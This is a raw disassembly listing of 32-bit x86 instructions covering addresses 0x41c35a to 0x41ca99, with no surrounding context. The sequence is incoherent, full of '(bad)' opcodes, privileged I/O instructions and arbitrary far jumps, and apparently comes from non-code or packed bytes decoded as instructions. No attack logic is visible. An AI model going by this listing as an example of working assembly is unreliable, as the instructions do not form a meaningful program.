  41c35a:	inc    ebx
  41c35b:	xchg   DWORD PTR [eax],esi
  41c35d:	xchg   edx,eax
  41c35e:	iret   
  41c35f:	cmp    al,0xcc
  41c361:	xlat   BYTE PTR ds:[ebx]
  41c362:	push   edi
  41c363:	push   ecx
  41c364:	std    
  41c365:	rol    edx,1
  41c367:	jb     0x41c331
  41c369:	pop    eax
  41c36a:	cdq    
  41c36b:	rcr    DWORD PTR ss:[edi+0x66],cl
  41c36f:	xchg   ebx,eax
  41c370:	fmul   DWORD PTR [ebx-0x1c]
  41c373:	sbb    ebp,DWORD PTR [edi+edi*2+0x7ee01b9d]
  41c37a:	xor    BYTE PTR [ebx],ah
  41c37c:	into   
  41c37d:	push   0xffffffa0
  41c37f:	mov    ebx,0xc455400a
  41c384:	pop    es
  41c385:	sbb    bl,BYTE PTR [edx+0x7f]
  41c388:	(bad)  
  41c389:	mov    ecx,0x10e9b277
  41c38e:	(bad)  
  41c390:	pop    edi
  41c391:	and    esi,DWORD PTR [ecx]
  41c393:	push   ecx
  41c394:	into   
  41c395:	fwait
  41c396:	jp     0x41c36c
  41c398:	mov    ecx,0x988da639
  41c39d:	ins    BYTE PTR es:[edi],dx
  41c39e:	shl    DWORD PTR [eax+0x5e],1
  41c3a1:	jge    0x41c3ba
  41c3a3:	mov    cl,0xbd
  41c3a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3a6:	jo     0x41c3dd
  41c3a8:	push   es
  41c3a9:	fst    DWORD PTR [edx]
  41c3ab:	push   ebp
  41c3ac:	inc    esi
  41c3ad:	mov    BYTE PTR [edx-0x12373b0d],bh
  41c3b3:	cmp    al,dl
  41c3b5:	popa   
  41c3b6:	(bad)  
  41c3b7:	mov    ebp,0x93586daf
  41c3bc:	(bad)  
  41c3bd:	(bad)  
  41c3be:	jmp    0x76685865
  41c3c3:	add    BYTE PTR [eax],0xb7
  41c3c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3c7:	ret    
  41c3c8:	(bad)  
  41c3ca:	loop   0x41c38d
  41c3cc:	or     bh,dl
  41c3ce:	inc    ebp
  41c3cf:	inc    esi
  41c3d0:	dec    eax
  41c3d1:	retf   
  41c3d2:	int3   
  41c3d3:	ins    BYTE PTR es:[edi],dx
  41c3d4:	arpl   WORD PTR [ebx-0x69],bp
  41c3d7:	(bad)  
  41c3d8:	mov    al,ds:0xd05b3cae
  41c3dd:	adc    eax,0x34eca1d1
  41c3e2:	sub    BYTE PTR [edi-0x33],dl
  41c3e5:	sub    DWORD PTR [ebp+0x51],0xff37c17d
  41c3ec:	mov    esp,0x30945cb
  41c3f1:	mov    BYTE PTR [esi+0x55],bl
  41c3f4:	pop    ebp
  41c3f5:	pop    edi
  41c3f6:	add    ah,BYTE PTR [esi-0x2db715c2]
  41c3fc:	mov    edx,0xd304b800
  41c401:	mov    bl,0x32
  41c403:	pushf  
  41c404:	pop    ds
  41c405:	xor    edi,esi
  41c407:	adc    ch,BYTE PTR [esi]
  41c409:	sbb    ch,al
  41c40b:	js     0x41c3fc
  41c40d:	bound  ebp,QWORD PTR [eax-0x4d]
  41c410:	dec    edx
  41c411:	mov    bl,0x68
  41c413:	xor    DWORD PTR [edx],ecx
  41c415:	push   es
  41c416:	pop    ebx
  41c417:	mov    esp,0x19b0e928
  41c41c:	rcl    DWORD PTR [ebp+0x46],1
  41c41f:	or     eax,ebx
  41c421:	jbe    0x41c435
  41c423:	hlt    
  41c424:	cmp    ebp,edi
  41c426:	repnz bound esp,QWORD PTR [esi+0x55b9e316]
  41c42d:	push   ebx
  41c42e:	ins    BYTE PTR es:[edi],dx
  41c42f:	push   edx
  41c430:	push   ecx
  41c431:	sub    bl,BYTE PTR [eax-0x5bbd7780]
  41c437:	js     0x41c473
  41c439:	mov    fs,WORD PTR [esi+0x6e]
  41c43c:	test   BYTE PTR [ebx-0x5ae7aa7d],cl
  41c442:	loop   0x41c3e0
  41c444:	push   0xffffffeb
  41c446:	pop    edx
  41c447:	ss ins BYTE PTR es:[edi],dx
  41c449:	or     ch,BYTE PTR [edi-0x44]
  41c44c:	or     al,0xc0
  41c44e:	frstor [edi]
  41c450:	(bad)  
  41c451:	pop    ds
  41c452:	ss das 
  41c454:	ret    
  41c455:	jg     0x41c44a
  41c457:	outs   dx,DWORD PTR ds:[esi]
  41c458:	hlt    
  41c459:	loop   0x41c497
  41c45b:	pop    es
  41c45c:	xchg   esp,eax
  41c45d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c45e:	push   ds
  41c45f:	jp     0x41c481
  41c461:	sahf   
  41c462:	jmp    0x217f:0x2ca7969c
  41c469:	cmp    BYTE PTR es:[edx-0x7213bf0],bl
  41c470:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c471:	clc    
  41c472:	sbb    ebp,DWORD PTR [edi-0x6f62ed20]
  41c478:	test   DWORD PTR [ebp-0x437f2b55],edx
  41c47e:	and    al,0x1c
  41c480:	xchg   edx,eax
  41c481:	add    eax,0x5bc8d3f7
  41c486:	add    edx,DWORD PTR [ebp-0x3c3bb2a3]
  41c48c:	scas   al,BYTE PTR es:[edi]
  41c48d:	push   edi
  41c48e:	int3   
  41c48f:	sbb    ah,BYTE PTR ds:0x9d12e37c
  41c495:	xlat   BYTE PTR ds:[ebx]
  41c496:	mov    ds:0x471bc3f8,al
  41c49b:	jle    0x41c4c6
  41c49d:	inc    ebx
  41c49e:	fisubr DWORD PTR [edx+ecx*4]
  41c4a1:	mov    dl,0xfd
  41c4a3:	pop    ebx
  41c4a4:	jl     0x41c4ec
  41c4a6:	leave  
  41c4a7:	scas   al,BYTE PTR es:[edi]
  41c4a8:	test   DWORD PTR [eax],edx
  41c4aa:	shl    BYTE PTR [edx],1
  41c4ac:	and    al,0xb2
  41c4ae:	inc    ebx
  41c4af:	jmp    FWORD PTR [edi-0x56ccf686]
  41c4b5:	and    al,0xb9
  41c4b7:	jecxz  0x41c4c6
  41c4b9:	mov    DWORD PTR [edi-0x4b8ad039],ecx
  41c4bf:	(bad)  
  41c4c2:	mov    ds:0x2b3cec11,eax
  41c4c7:	int    0xf7
  41c4c9:	stc    
  41c4ca:	out    dx,eax
  41c4cb:	dec    eax
  41c4cc:	fiadd  WORD PTR [esi-0x24e754df]
  41c4d2:	fdiv   st,st(5)
  41c4d4:	or     dl,BYTE PTR [edi-0x28]
  41c4d7:	inc    ebx
  41c4d8:	xor    al,BYTE PTR [eax]
  41c4da:	sar    DWORD PTR [esi],1
  41c4dc:	pop    ecx
  41c4dd:	hlt    
  41c4de:	adc    esi,0x59120b27
  41c4e4:	lods   eax,DWORD PTR ds:[esi]
  41c4e5:	mov    ds:0xc3d3b999,eax
  41c4ea:	(bad)  
  41c4eb:	js     0x41c522
  41c4ed:	cmc    
  41c4ee:	daa    
  41c4ef:	cdq    
  41c4f0:	out    0x96,eax
  41c4f2:	repnz inc ebp
  41c4f4:	lahf   
  41c4f5:	aad    0xd6
  41c4f7:	jp     0x41c4c4
  41c4f9:	out    dx,al
  41c4fa:	dec    esp
  41c4fb:	iret   
  41c4fc:	stos   BYTE PTR es:[edi],al
  41c4fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4fe:	loop   0x41c54a
  41c500:	mov    esp,ds
  41c502:	add    BYTE PTR [ecx+0x3e9b5e5d],dl
  41c508:	inc    eax
  41c509:	jg     0x41c541
  41c50b:	xlat   BYTE PTR ds:[ebx]
  41c50c:	(bad)  
  41c50d:	icebp  
  41c50e:	test   al,0xdb
  41c510:	bound  ecx,QWORD PTR [edi+0x73d977ae]
  41c516:	add    al,0x8a
  41c518:	adc    edi,esp
  41c51a:	and    edi,DWORD PTR [eax-0xa]
  41c51d:	ja     0x41c4b7
  41c51f:	scas   al,BYTE PTR es:[edi]
  41c520:	push   ebp
  41c521:	mov    esp,0x2931fc71
  41c526:	push   es
  41c527:	clc    
  41c528:	push   0x79
  41c52a:	sub    eax,0x3974890d
  41c52f:	inc    ebx
  41c530:	dec    edx
  41c531:	sub    ebp,DWORD PTR [esi-0xe]
  41c534:	mov    al,ds:0x1a3d316a
  41c539:	mov    dh,0x7
  41c53b:	cld    
  41c53c:	test   dh,dh
  41c53e:	xor    eax,0x7f267987
  41c543:	scas   eax,DWORD PTR es:[edi]
  41c544:	ret    
  41c545:	imul   esp,DWORD PTR [ecx-0x7148d5b7],0x2d
  41c54c:	pop    eax
  41c54d:	(bad)  
  41c54e:	ret    0x5516
  41c551:	pop    ebp
  41c552:	rcl    BYTE PTR [eax],1
  41c554:	sub    dl,BYTE PTR [edx-0x80]
  41c557:	cmp    BYTE PTR [ebx+0x26],dh
  41c55a:	fisubr WORD PTR [eax-0x48]
  41c55d:	push   esi
  41c55e:	imul   eax,DWORD PTR [edx+0x2a],0xffffff9a
  41c562:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c563:	jp     0x41c542
  41c565:	push   0x77455be5
  41c56a:	and    dh,ch
  41c56c:	sbb    DWORD PTR [ecx+0x41f60f66],ebp
  41c572:	push   es
  41c573:	push   ebp
  41c574:	add    DWORD PTR [ebx-0x47],eax
  41c577:	mov    DWORD PTR [esi-0x12],ecx
  41c57a:	int3   
  41c57b:	mov    ds:0xafdfa0c8,eax
  41c580:	cmp    BYTE PTR [esi+0x60],bl
  41c583:	nop
  41c584:	jns    0x41c587
  41c586:	mov    esi,DWORD PTR [edi+edx*8]
  41c589:	jle    0x41c59d
  41c58b:	jge    0x41c5cd
  41c58d:	je     0x41c53a
  41c58f:	jnp    0x41c555
  41c591:	das    
  41c592:	jne    0x41c5f6
  41c594:	aaa    
  41c595:	sbb    DWORD PTR [eiz*4+0x3987c351],0x620cc70f
  41c5a0:	test   DWORD PTR [ebx],eax
  41c5a2:	sub    eax,0x631f76ae
  41c5a7:	add    bl,BYTE PTR [esi+0x2e290e5d]
  41c5ad:	outs   dx,DWORD PTR ds:[esi]
  41c5ae:	cs add eax,0x832816c0
  41c5b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5b5:	lods   eax,DWORD PTR ds:[esi]
  41c5b6:	sub    ch,cl
  41c5b8:	xchg   ecx,eax
  41c5b9:	cmp    edx,ebp
  41c5bb:	(bad)  
  41c5bc:	cwde   
  41c5bd:	test   ebp,ebp
  41c5bf:	imul   esi,eax,0x81d9817a
  41c5c5:	int3   
  41c5c6:	cmc    
  41c5c7:	mov    cl,0x70
  41c5c9:	js     0x41c634
  41c5cb:	popf   
  41c5cc:	pop    ss
  41c5cd:	mov    ch,0xd0
  41c5cf:	ja     0x41c5cb
  41c5d1:	push   esi
  41c5d2:	aaa    
  41c5d3:	pop    ds
  41c5d4:	cmp    ecx,DWORD PTR ds:0xd9510c0a
  41c5da:	test   eax,0x1bfe0ea0
  41c5df:	(bad)  
  41c5e0:	iret   
  41c5e1:	ss xchg esi,eax
  41c5e3:	inc    edi
  41c5e4:	mov    edi,0x12b37d7
  41c5e9:	(bad)  
  41c5ea:	cld    
  41c5eb:	mov    BYTE PTR [eax],ch
  41c5ed:	and    DWORD PTR [edi],esi
  41c5ef:	sub    DWORD PTR [esi+0x3a360451],0x815c85cf
  41c5f9:	imul   eax,DWORD PTR [ebp+0x31],0x78a3ffab
  41c600:	mov    ebp,0x95b6ad8b
  41c605:	inc    edi
  41c606:	call   0x744b:0xbd251446
  41c60d:	sbb    eax,0x3e6dd6b3
  41c612:	mov    cl,0x83
  41c614:	retf   0xc204
  41c617:	in     al,dx
  41c618:	cmp    BYTE PTR [ebp+0x3a],al
  41c61b:	and    ebx,edx
  41c61d:	mov    eax,ds:0x731e599f
  41c622:	fdiv   QWORD PTR [edx+edi*1]
  41c625:	je     0x41c67e
  41c627:	or     ecx,edi
  41c629:	stos   DWORD PTR es:[edi],eax
  41c62a:	adc    al,0x42
  41c62c:	push   ebx
  41c62d:	push   edi
  41c62e:	push   cs
  41c62f:	mov    ebp,0xb5c22a8b
  41c634:	mov    ds:0x76025848,al
  41c639:	cmp    cl,BYTE PTR [edi-0x2ad7c1b5]
  41c63f:	hlt    
  41c640:	mov    DWORD PTR [ecx-0xc],0x44487c47
  41c647:	inc    ecx
  41c648:	jmp    0x1fb3:0x8c6383d4
  41c64f:	push   cs
  41c650:	popf   
  41c651:	xor    ebp,DWORD PTR [edx+0x6c]
  41c654:	shr    DWORD PTR [ebp-0x32],1
  41c657:	pop    esp
  41c658:	or     ecx,DWORD PTR [ebp-0x38]
  41c65b:	xchg   bh,cl
  41c65d:	inc    esp
  41c65e:	idiv   cl
  41c660:	test   al,0x4a
  41c662:	dec    ebx
  41c663:	call   0x277f:0xdd96aa89
  41c66a:	inc    edx
  41c66b:	xor    al,0xdb
  41c66d:	inc    esp
  41c66e:	and    ebp,edi
  41c670:	mov    WORD PTR [esi+eax*8],?
  41c673:	sbb    BYTE PTR [ebp+0x3e],ah
  41c676:	pcmpeqd mm0,QWORD PTR [edi]
  41c679:	call   0xc9a5:0x4f60ca27
  41c680:	stos   DWORD PTR es:[edi],eax
  41c681:	cmp    BYTE PTR [edx],dl
  41c683:	mov    ?,WORD PTR [edi]
  41c685:	sbb    dh,BYTE PTR [edx-0x1704ab55]
  41c68b:	hlt    
  41c68c:	sub    ah,dl
  41c68e:	call   0x47b06794
  41c693:	and    eax,0x215f2eb6
  41c698:	test   BYTE PTR [ebx+eiz*2-0x2ba44136],bh
  41c69f:	test   DWORD PTR [ebx],ebx
  41c6a1:	daa    
  41c6a2:	test   edi,ebx
  41c6a4:	or     dl,BYTE PTR [esi+edx*1]
  41c6a7:	scas   eax,DWORD PTR es:[edi]
  41c6a8:	aaa    
  41c6a9:	or     al,0x8c
  41c6ab:	mov    bh,al
  41c6ad:	call   0x16e162f
  41c6b2:	adc    DWORD PTR ds:0xeefb6700,edi
  41c6b8:	ins    BYTE PTR es:[edi],dx
  41c6b9:	sbb    bh,dh
  41c6bb:	sbb    ecx,ebx
  41c6bd:	scas   eax,DWORD PTR es:[edi]
  41c6be:	inc    esi
  41c6bf:	in     al,0x65
  41c6c1:	xchg   ecx,eax
  41c6c2:	in     al,dx
  41c6c3:	jo     0x41c6cb
  41c6c5:	inc    esi
  41c6c6:	lahf   
  41c6c7:	mov    ch,0x7d
  41c6c9:	or     BYTE PTR [ecx],cl
  41c6cb:	add    al,0xef
  41c6cd:	shl    DWORD PTR [ebp-0x3e],1
  41c6d0:	mov    WORD PTR [edi-0x956be76],fs
  41c6d6:	add    eax,0xeb92989
  41c6db:	sub    al,cl
  41c6dd:	stos   DWORD PTR es:[edi],eax
  41c6de:	sub    eax,0xde0bf01d
  41c6e3:	sbb    bl,BYTE PTR [ecx-0x586e2c7e]
  41c6e9:	in     al,0x3a
  41c6eb:	and    dh,BYTE PTR [edi+0x31]
  41c6ee:	xchg   ch,bl
  41c6f0:	pop    ebx
  41c6f1:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41c6f3:	jmp    0x477ab987
  41c6f8:	or     dl,cl
  41c6fa:	pop    ecx
  41c6fb:	xchg   edi,eax
  41c6fc:	call   FWORD PTR [edi-0x138a591f]
  41c702:	mov    DWORD PTR [esi-0x55],edi
  41c705:	stc    
  41c706:	ins    BYTE PTR es:[edi],dx
  41c707:	test   al,0x54
  41c709:	adc    ebx,DWORD PTR [edi+ebx*8+0x63e4f641]
  41c710:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  41c712:	pop    esi
  41c713:	or     cl,BYTE PTR [ebx-0x73]
  41c716:	neg    BYTE PTR gs:[ebx]
  41c719:	or     ch,BYTE PTR [esi+0x811645a]
  41c71f:	sub    al,0x1b
  41c721:	inc    edx
  41c722:	or     BYTE PTR [esi+0xfe2d473],dl
  41c728:	xchg   esp,eax
  41c729:	mov    bl,0x1f
  41c72b:	sub    eax,0x6809858e
  41c730:	popa   
  41c731:	in     al,dx
  41c732:	and    dh,al
  41c734:	and    BYTE PTR [eax+0x1924f8db],0xc0
  41c73b:	cmp    esp,ebp
  41c73d:	mov    esi,0x55c50ee5
  41c742:	and    BYTE PTR [ebx-0x5],dh
  41c745:	js     0x41c769
  41c747:	pop    edx
  41c748:	icebp  
  41c749:	inc    ebp
  41c74a:	sbb    eax,0x3534410f
  41c74f:	sub    esi,eax
  41c751:	add    BYTE PTR [ebx],al
  41c753:	loope  0x41c731
  41c755:	pop    esi
  41c756:	mov    ds:0xe1304165,al
  41c75b:	nop
  41c75c:	stos   DWORD PTR es:[edi],eax
  41c75d:	retf   
  41c75e:	xchg   ecx,eax
  41c75f:	sub    eax,0x815355af
  41c764:	jns    0x41c7bf
  41c766:	mov    ss,WORD PTR [ebx+0xb]
  41c769:	bound  ecx,QWORD PTR [ebx]
  41c76b:	mov    ds,WORD PTR [ebp+eax*1+0x1de6cbba]
  41c772:	push   eax
  41c773:	add    eax,0x3f830fcf
  41c778:	(bad)  
  41c779:	(bad)  
  41c77a:	pop    ss
  41c77b:	jecxz  0x41c773
  41c77d:	add    BYTE PTR [ecx-0x19],cl
  41c780:	adc    eax,0xf3106d13
  41c785:	aam    0xa6
  41c787:	loop   0x41c79e
  41c789:	cmp    ebx,eax
  41c78b:	add    ecx,DWORD PTR [ebx]
  41c78d:	xor    BYTE PTR [ebx-0x3fb0b2f2],ch
  41c793:	ja     0x41c75c
  41c795:	ret    0xdcd7
  41c798:	fnsave [ebp+0x470e1f1b]
  41c79e:	dec    ebx
  41c79f:	or     ebx,edi
  41c7a1:	cmp    esi,esi
  41c7a3:	fwait
  41c7a4:	stos   BYTE PTR es:[edi],al
  41c7a5:	pop    esi
  41c7a6:	dec    edx
  41c7a7:	push   0x66c57d97
  41c7ac:	retf   0x5e19
  41c7af:	jb     0x41c810
  41c7b1:	xchg   esp,eax
  41c7b2:	jb     0x41c7a4
  41c7b4:	dec    esp
  41c7b5:	push   es
  41c7b6:	or     ebp,edi
  41c7b8:	les    edx,FWORD PTR [ecx+0x38ea5324]
  41c7be:	add    eax,0xecb3790d
  41c7c3:	hlt    
  41c7c4:	pop    esp
  41c7c5:	and    BYTE PTR [esi-0x59cf6fe1],ah
  41c7cb:	(bad)  
  41c7cc:	in     al,dx
  41c7cd:	and    BYTE PTR [ecx-0x7dd3ff70],al
  41c7d3:	sub    bh,BYTE PTR [esi-0x1824a125]
  41c7d9:	sub    al,0x10
  41c7db:	in     al,0x81
  41c7dd:	rcr    ebp,0x40
  41c7e0:	and    BYTE PTR [edi-0x2a],0x77
  41c7e4:	mov    ah,0x46
  41c7e6:	xchg   ebp,eax
  41c7e7:	sahf   
  41c7e8:	out    0x37,al
  41c7ea:	adc    eax,0x12bea9bb
  41c7ef:	jmp    0xb9fe:0xcf5e5cd
  41c7f6:	cmp    al,0x62
  41c7f8:	push   esp
  41c7f9:	lds    ecx,FWORD PTR [edi-0x5a0d5eba]
  41c7ff:	adc    eax,0xe3e3f323
  41c804:	loop   0x41c827
  41c806:	mov    ebp,0x46612075
  41c80b:	push   esp
  41c80c:	dec    esp
  41c80d:	sub    BYTE PTR [esi],cl
  41c80f:	and    BYTE PTR [edx-0x6e],dl
  41c812:	outs   dx,BYTE PTR ds:[esi]
  41c813:	jbe    0x41c80b
  41c815:	inc    esi
  41c816:	adc    BYTE PTR [ebp+0x53],bl
  41c819:	stos   DWORD PTR es:[edi],eax
  41c81a:	jae    0x41c7ec
  41c81c:	bound  edx,QWORD PTR es:[edi+0x69]
  41c820:	ss stos BYTE PTR es:[edi],al
  41c822:	push   esp
  41c823:	bound  ebp,QWORD PTR [edx+esi*1]
  41c826:	or     eax,DWORD PTR [ebp-0x4b2a326e]
  41c82c:	adc    DWORD PTR [ecx+eiz*4+0x67],esi
  41c830:	jb     0x41c869
  41c832:	xor    ecx,DWORD PTR [edi+0x4d]
  41c835:	mov    esp,0x86b9ca2c
  41c83a:	jmp    0xa276:0xeb928d44
  41c841:	mov    ebp,0x7c7f533f
  41c846:	xor    DWORD PTR [esi],eax
  41c848:	(bad)
  41c84c:	(bad)  
  41c84d:	mov    WORD PTR [edi+edx*8+0x4bee7a4],cs
  41c854:	jge    0x41c8b6
  41c856:	push   esp
  41c857:	dec    esp
  41c858:	rcr    DWORD PTR [eax-0x43],1
  41c85b:	xor    ecx,DWORD PTR [ebx+0x27d3b96f]
  41c861:	push   0x7c1136c8
  41c866:	adc    BYTE PTR [eax+0x5c],bl
  41c869:	jae    0x41c8e6
  41c86b:	sub    eax,0xd7e7579f
  41c870:	or     BYTE PTR [ebx],cl
  41c872:	mov    edx,DWORD PTR [ecx]
  41c874:	pop    esi
  41c875:	jle    0x41c8d9
  41c877:	fstp   TBYTE PTR [ebx+ebp*4]
  41c87a:	sti    
  41c87b:	sbb    eax,0x1745ecf8
  41c880:	jmp    0xf446:0x192e7be3
  41c887:	inc    ebp
  41c888:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c889:	leave  
  41c88a:	adc    al,0x59
  41c88c:	aad    0xcd
  41c88e:	sub    esi,ebx
  41c890:	push   ds
  41c891:	sbb    edx,DWORD PTR [eax]
  41c893:	outs   dx,BYTE PTR ds:[esi]
  41c894:	add    al,0xef
  41c896:	lods   al,BYTE PTR ds:[esi]
  41c897:	pop    esi
  41c898:	pop    edi
  41c899:	push   ebx
  41c89a:	cmp    DWORD PTR [ecx+0x21a73757],ebp
  41c8a0:	lea    esp,[ecx+eax*2-0x6f]
  41c8a4:	daa    
  41c8a5:	ss pop edx
  41c8a7:	or     ebx,ebp
  41c8a9:	mov    edx,0xc0d84791
  41c8ae:	mov    dl,0x2e
  41c8b0:	push   0x5d7241d1
  41c8b5:	fdivr  st(3),st
  41c8b7:	test   al,0x30
  41c8b9:	fdiv   QWORD PTR [esi+eax*4+0x0]
  41c8bd:	gs es inc esp
  41c8c0:	sbb    ah,BYTE PTR ds:0x92c731b8
  41c8c6:	cmp    al,0xe6
  41c8c8:	push   0x663e406c
  41c8cd:	sti    
  41c8ce:	and    cl,BYTE PTR [esi-0x6b98c8bd]
  41c8d4:	ja     0x41c8e4
  41c8d6:	in     eax,dx
  41c8d7:	ja     0x41c880
  41c8d9:	imul   esp,ecx,0xffffffbb
  41c8dc:	inc    ebx
  41c8dd:	sbb    ebp,DWORD PTR [edi+0x5]
  41c8e0:	test   BYTE PTR [esi],0xeb
  41c8e3:	fdivr  QWORD PTR [ebp-0x67]
  41c8e6:	cmp    esp,DWORD PTR [edi+0xa]
  41c8e9:	mov    esi,0x37747c6a
  41c8ee:	jmp    0x41c8cc
  41c8f0:	test   DWORD PTR [esi],ebp
  41c8f2:	dec    ebp
  41c8f3:	xlat   BYTE PTR ds:[ebx]
  41c8f4:	data16 fmul QWORD PTR [edi+0x52]
  41c8f8:	inc    eax
  41c8f9:	outs   dx,BYTE PTR ds:[esi]
  41c8fa:	mov    dl,0x58
  41c8fc:	xchg   ecx,eax
  41c8fd:	add    esi,edi
  41c8ff:	dec    BYTE PTR [ecx]
  41c901:	(bad)  
  41c902:	fwait
  41c903:	add    BYTE PTR [ebx-0x72],bh
  41c906:	and    BYTE PTR [edx],ah
  41c908:	xchg   ecx,eax
  41c909:	adc    al,0xa3
  41c90b:	sub    al,0x29
  41c90d:	and    al,0xe6
  41c90f:	mov    ch,0x10
  41c911:	dec    eax
  41c912:	shl    DWORD PTR [edx-0x2b],cl
  41c915:	and    edx,DWORD PTR [edi]
  41c917:	loope  0x41c956
  41c919:	sti    
  41c91a:	rol    esi,0x4f
  41c91d:	inc    esp
  41c91e:	fwait
  41c91f:	jne    0x41c8e8
  41c921:	je     0x41c963
  41c923:	rcr    BYTE PTR [edx+esi*2-0x467b95ef],cl
  41c92a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c92b:	jge    0x41c9aa
  41c92d:	sub    esp,DWORD PTR [ebx-0x57ca141b]
  41c933:	mov    al,0xa9
  41c935:	repz repnz or edx,DWORD PTR [eax]
  41c939:	pop    ebx
  41c93a:	rcl    bl,0x4d
  41c93d:	jno    0x41c928
  41c93f:	xchg   edx,eax
  41c940:	jge    0x41c8fd
  41c942:	xor    ah,BYTE PTR [edx+0x6008b63d]
  41c948:	xchg   ebx,eax
  41c949:	mov    eax,ds:0x8292cc94
  41c94e:	push   ds
  41c94f:	int3   
  41c950:	cmp    esi,DWORD PTR [edi-0x23]
  41c953:	pop    edx
  41c954:	push   esi
  41c955:	popa   
  41c956:	mov    cl,0x1
  41c958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c959:	or     BYTE PTR [ebp+0x58],ah
  41c95c:	(bad)  
  41c95e:	cdq    
  41c95f:	popa   
  41c960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c961:	popf   
  41c962:	sahf   
  41c963:	mov    ebp,0x5512439e
  41c968:	mov    ds:0xda8021a7,al
  41c96d:	retf   0x393c
  41c970:	adc    eax,0x4156cca8
  41c975:	jl     0x41c99a
  41c977:	lock aaa 
  41c979:	sub    eax,0x7aec82bb
  41c97e:	inc    ebp
  41c97f:	xlat   BYTE PTR ds:[ebx]
  41c980:	cs and eax,0x84cbf428
  41c986:	or     edx,DWORD PTR [eax+0x72]
  41c989:	into   
  41c98a:	sahf   
  41c98b:	or     dh,BYTE PTR [edx+ebp*4-0x46d4033c]
  41c992:	mov    edi,0x937922f8
  41c997:	cmp    dl,BYTE PTR [eax-0x25]
  41c99a:	fcom   QWORD PTR [ecx]
  41c99c:	dec    eax
  41c99d:	lahf   
  41c99e:	ss mov ebx,0x9ee21144
  41c9a4:	xor    al,BYTE PTR [edi]
  41c9a6:	shl    edi,cl
  41c9a8:	jnp    0x41c94f
  41c9aa:	and    DWORD PTR [edx],0xe8e783d5
  41c9b0:	push   ebx
  41c9b1:	in     eax,0x3c
  41c9b3:	inc    edx
  41c9b4:	mov    al,0x68
  41c9b6:	dec    ebx
  41c9b7:	add    DWORD PTR [ecx+0x3028d7df],ebp
  41c9bd:	lahf   
  41c9be:	xor    dl,BYTE PTR [esi-0x58]
  41c9c1:	addr16 dec esp
  41c9c3:	xlat   BYTE PTR ds:[ebx]
  41c9c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9c5:	das    
  41c9c6:	xchg   al,bl
  41c9c8:	(bad)  
  41c9c9:	int    0x52
  41c9cb:	mov    esp,0x4e9d174c
  41c9d0:	pop    edi
  41c9d1:	in     eax,0x24
  41c9d3:	inc    edx
  41c9d4:	cdq    
  41c9d5:	pop    edx
  41c9d6:	dec    edx
  41c9d7:	jno    0x41c972
  41c9d9:	jbe    0x41c986
  41c9db:	add    bh,dl
  41c9dd:	jb     0x41c9bd
  41c9df:	(bad)  
  41c9e0:	dec    ebp
  41c9e1:	je     0x41c99b
  41c9e3:	sub    DWORD PTR [ebp+eiz*1-0x2f],eax
  41c9e7:	lahf   
  41c9e8:	or     al,0xd8
  41c9ea:	push   ecx
  41c9eb:	push   ds
  41c9ec:	sbb    BYTE PTR [eax+0x38678068],al
  41c9f2:	jle    0x41ca6e
  41c9f4:	cmp    eax,0xda78bcfa
  41c9f9:	mov    eax,DWORD PTR [edx]
  41c9fb:	jle    0x41c9b9
  41c9fd:	into   
  41c9fe:	xchg   esi,eax
  41c9ff:	into   
  41ca00:	das    
  41ca01:	and    eax,DWORD PTR [si]
  41ca04:	loop   0x41c9e2
  41ca06:	mov    ebp,0xdb346830
  41ca0b:	nop
  41ca0c:	and    al,0x6
  41ca0e:	adc    ecx,ebx
  41ca10:	adc    edx,eax
  41ca12:	xchg   ebp,eax
  41ca13:	nop
  41ca14:	mov    edx,0x7d542bac
  41ca19:	neg    DWORD PTR [edi]
  41ca1b:	fwait
  41ca1c:	popa   
  41ca1d:	ret    
  41ca1e:	xor    DWORD PTR [ecx-0x30],esp
  41ca21:	fidiv  WORD PTR [edx+0x69]
  41ca24:	and    ebp,eax
  41ca26:	lds    edi,FWORD PTR [edx-0xc1a5944]
  41ca2c:	stos   DWORD PTR es:[edi],eax
  41ca2d:	pop    ecx
  41ca2e:	ins    DWORD PTR es:[edi],dx
  41ca2f:	mov    DWORD PTR [esi+0x7d],eax
  41ca32:	push   ecx
  41ca33:	jg     0x41ca6e
  41ca35:	push   es
  41ca36:	xor    al,BYTE PTR [edi+0x5cd4d121]
  41ca3c:	xor    ch,ch
  41ca3e:	retf   0x3122
  41ca41:	adc    eax,0xf40b0940
  41ca46:	lahf   
  41ca47:	mov    dl,0xad
  41ca49:	repnz in eax,0xcf
  41ca4c:	push   edi
  41ca4d:	jno    0x41cab2
  41ca4f:	rol    BYTE PTR [edi],1
  41ca51:	push   edx
  41ca52:	ss and eax,0xd19a9458
  41ca58:	lods   al,BYTE PTR ds:[esi]
  41ca59:	sbb    eax,0xd3216eff
  41ca5e:	adc    al,0x9
  41ca60:	int    0x1
  41ca62:	addr16 or al,0xb3
  41ca65:	stos   BYTE PTR es:[edi],al
  41ca66:	push   ebp
  41ca67:	inc    ebx
  41ca68:	data16 mov bl,0xf6
  41ca6b:	and    edx,DWORD PTR [edx-0x6d7b9dc9]
  41ca71:	xchg   DWORD PTR [edi],ebx
  41ca73:	push   ds
  41ca74:	rcr    dl,1
  41ca76:	lods   eax,DWORD PTR ds:[esi]
  41ca77:	icebp  
  41ca78:	pop    ds
  41ca79:	aam    0xc1
  41ca7b:	test   eax,0x47bfacb4
  41ca80:	sahf   
  41ca81:	sbb    esp,DWORD PTR [ecx+0x2aabf998]
  41ca87:	xor    cl,cl
  41ca89:	arpl   WORD PTR [esi+edx*1-0x6e],bp
  41ca8d:	icebp  
  41ca8e:	sar    DWORD PTR [ebx-0x2e],cl
  41ca91:	imul   ebp,DWORD PTR [esp+eax*4],0x8b63125d
  41ca98:	push   eax
  41ca99:	icebp  
